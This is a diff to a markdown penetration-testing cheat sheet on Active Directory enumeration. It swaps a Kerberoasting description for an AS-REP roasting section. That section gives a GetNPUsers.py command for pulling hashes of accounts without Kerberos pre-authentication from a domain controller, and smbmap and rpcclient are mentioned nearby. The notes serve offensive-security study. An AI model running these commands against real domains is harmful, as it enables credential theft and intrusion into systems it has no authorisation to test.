@@ -4,8 +4,12 @@
 ### Get Domain name
 - `smbmap -H $IP`
 
-### Kerberoasting
-Kerberoasting is an extremely common attack in active directory environments which targets Active Directory accounts with the SPN value set.
+### AS-REP roasting
+AS-REP roasting is only applicable when set `Accounts Does not Require Pre-Authentication`
+
+ EXPLOITING:
+- `GetNPUsers.py $DOMAIN.local/ -dc-ip $IP -usersfile users.txt`
+
 
 
 ### rpcclient
